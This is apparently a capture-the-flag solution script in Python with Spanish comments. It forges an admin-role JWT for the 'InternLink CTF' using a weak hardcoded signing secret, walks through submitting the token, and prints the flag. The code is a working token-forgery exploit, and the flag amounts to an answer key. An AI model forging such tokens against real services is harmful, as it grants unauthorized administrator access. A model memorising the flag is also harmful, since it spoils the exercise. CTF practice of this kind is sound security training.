#!/usr/bin/env python3
"""
JWT Forge Script - ACTO 7
Genera un token JWT falso con rol de admin
"""

import jwt
import sys

# Secret débil descubierto en el ACTO 6
JWT_SECRET = 'internlink2024'

def create_admin_token(user_id='999', email='hacker@test.com'):
    """
    Crea un token JWT con rol de admin
    
    Args:
        user_id: ID del usuario (puede ser cualquiera)
        email: Email del usuario (puede ser cualquiera)
    
    Returns:
        Token JWT firmado
    """
    payload = {
        'user_id': user_id,
        'email': email,
        'role': 'admin'  # ¡Rol de administrador!
    }
    
    token = jwt.encode(payload, JWT_SECRET, algorithm='HS256')
    return token

def verify_token(token):
    """
    Verifica y decodifica un token JWT
    
    Args:
        token: Token JWT a verificar
    
    Returns:
        Payload decodificado
    """
    try:
        payload = jwt.decode(token, JWT_SECRET, algorithms=['HS256'])
        return payload
    except jwt.InvalidTokenError as e:
        return f"Error: {e}"

def main():
    print("=" * 60)
    print("JWT FORGE TOOL - InternLink CTF")
    print("=" * 60)
    print()
    
    if len(sys.argv) > 1:
        # Modo: verificar token existente
        if sys.argv[1] == 'verify':
            if len(sys.argv) < 3:
                print("Uso: python jwt_forge.py verify <token>")
                return
            
            token = sys.argv[2]
            print(f"🔍 Verificando token...")
            print()
            result = verify_token(token)
            print("Resultado:")
            print(result)
        else:
            print("Comando no reconocido")
            print("Uso: python jwt_forge.py [verify <token>]")
    else:
        # Modo: crear token de admin
        print("🔨 Generando token JWT con rol de admin...")
        print()
        
        # Personalizar si se desea
        user_id = input("User ID (Enter para usar '999'): ").strip() or '999'
        email = input("Email (Enter para usar 'hacker@test.com'): ").strip() or 'hacker@test.com'
        
        print()
        print("📝 Payload:")
        print(f"   user_id: {user_id}")
        print(f"   email: {email}")
        print(f"   role: admin")
        print()
        
        token = create_admin_token(user_id, email)
        
        print("✅ Token generado exitosamente:")
        print()
        print("━" * 60)
        print(token)
        print("━" * 60)
        print()
        
        print("💡 Uso:")
        print()
        print("1. Copia el token de arriba")
        print()
        print("2. En el panel de coordinador, ve a '🔐 Acceso Avanzado'")
        print()
        print("3. Pega el token y click en 'Verificar Token'")
        print()
        print("4. Si el role es 'admin', capturarás el flag:")
        print("   FLAG{jwt_forged_successfully}")
        print()
        
        # Verificar el token creado
        print("🔍 Verificación del token:")
        payload = verify_token(token)
        print(payload)
        print()
        
        print("═" * 60)
        print("¡Listo! Usa el token para el ACTO 7 🚩")
        print("═" * 60)

if __name__ == '__main__':
    main()
